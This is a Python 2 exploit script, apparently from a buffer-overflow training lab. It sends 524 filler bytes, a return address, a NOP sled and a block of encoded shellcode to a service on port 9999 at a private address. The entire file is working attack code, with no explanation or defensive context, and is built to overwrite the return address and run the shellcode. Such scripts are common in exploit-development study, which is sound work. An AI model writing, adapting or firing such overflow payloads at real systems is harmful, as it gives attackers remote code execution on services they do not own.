import socket
import sys

retn = "\xf3\x12\x17\x31"
padding = "\x90" * 20
shellcode = ("\xd9\xed\xba\x9c\xd6\x9a\x59\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xc0\x04\x31\x50\x13\x03\xcc\xc5\x78\xac\x10\x01\xfe"
"\x4f\xe8\xd2\x9f\xc6\x0d\xe3\x9f\xbd\x46\x54\x10\xb5\x0a\x59"
"\xdb\x9b\xbe\xea\xa9\x33\xb1\x5b\x07\x62\xfc\x5c\x34\x56\x9f"
"\xde\x47\x8b\x7f\xde\x87\xde\x7e\x27\xf5\x13\xd2\xf0\x71\x81"
"\xc2\x75\xcf\x1a\x69\xc5\xc1\x1a\x8e\x9e\xe0\x0b\x01\x94\xba"
"\x8b\xa0\x79\xb7\x85\xba\x9e\xf2\x5c\x31\x54\x88\x5e\x93\xa4"
"\x71\xcc\xda\x08\x80\x0c\x1b\xae\x7b\x7b\x55\xcc\x06\x7c\xa2"
"\xae\xdc\x09\x30\x08\x96\xaa\x9c\xa8\x7b\x2c\x57\xa6\x30\x3a"
"\x3f\xab\xc7\xef\x34\xd7\x4c\x0e\x9a\x51\x16\x35\x3e\x39\xcc"
"\x54\x67\xe7\xa3\x69\x77\x48\x1b\xcc\xfc\x65\x48\x7d\x5f\xe2"
"\xbd\x4c\x5f\xf2\xa9\xc7\x2c\xc0\x76\x7c\xba\x68\xfe\x5a\x3d"
"\x8e\xd5\x1b\xd1\x71\xd6\x5b\xf8\xb5\x82\x0b\x92\x1c\xab\xc7"
"\x62\xa0\x7e\x47\x32\x0e\xd1\x28\xe2\xee\x81\xc0\xe8\xe0\xfe"
"\xf1\x13\x2b\x97\x98\xee\xbc\x58\xf4\xf1\x5a\x31\x07\xf1\xa6"
"\x13\x8e\x17\xcc\x83\xc7\x80\x79\x3d\x42\x5a\x1b\xc2\x58\x27"
"\x1b\x48\x6f\xd8\xd2\xb9\x1a\xca\x83\x49\x51\xb0\x02\x55\x4f"
"\xdc\xc9\xc4\x14\x1c\x87\xf4\x82\x4b\xc0\xcb\xda\x19\xfc\x72"
"\x75\x3f\xfd\xe3\xbe\xfb\xda\xd7\x41\x02\xae\x6c\x66\x14\x76"
"\x6c\x22\x40\x26\x3b\xfc\x3e\x80\x95\x4e\xe8\x5a\x49\x19\x7c"
"\x1a\xa1\x9a\xfa\x23\xec\x6c\xe2\x92\x59\x29\x1d\x1a\x0e\xbd"
"\x66\x46\xae\x42\xbd\xc2\xde\x08\x9f\x63\x77\xd5\x4a\x36\x1a"
"\xe6\xa1\x75\x23\x65\x43\x06\xd0\x75\x26\x03\x9c\x31\xdb\x79"
"\x8d\xd7\xdb\x2e\xae\xfd")
payload = "A" * 524 + retn + padding + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect(('192.168.1.104', 9999))
except:
    print "Error"
    sys.exit(0)

s.recv(1024)
s.send(payload)
